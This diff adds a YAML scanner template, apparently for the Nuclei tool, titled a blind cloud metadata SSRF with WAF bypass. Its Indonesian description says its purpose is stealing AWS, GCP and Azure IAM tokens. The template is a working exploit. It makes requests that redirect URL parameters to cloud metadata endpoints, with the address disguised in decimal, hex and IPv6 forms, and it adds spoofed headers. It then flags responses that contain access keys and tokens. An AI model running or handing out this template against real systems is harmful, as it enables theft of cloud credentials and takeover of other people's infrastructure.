@@ -1,0 +1,39 @@
+id: ghost-ssrf-cloud-bypass
+
+info:
+  name: Blind Cloud Metadata SSRF (WAF Bypass)
+  author: Sniper-Predator
+  severity: critical
+  description: Mencuri token IAM AWS/GCP/Azure melalui parameter URL menggunakan Decimal/IPv6 Bypass.
+  tags: ssrf,cloud,aws,gcp,azure,custom
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://2852039166/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/?endpoint=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/?proxy=http://[::ffff:169.254.169.254]/latest/meta-data/"
+      - "{{BaseURL}}/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?webhook=http://169.254.169.254/latest/dynamic/instance-identity/document"
+
+    headers:
+      Metadata-Flavor: "Google"
+      X-Forwarded-For: "127.0.0.1"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "Token"
+        condition: and
+        part: body
+
+      - type: word
+        words:
+          - "instance-id"
+          - "project-id"
+          - "service-accounts"
+        condition: or
+        part: body
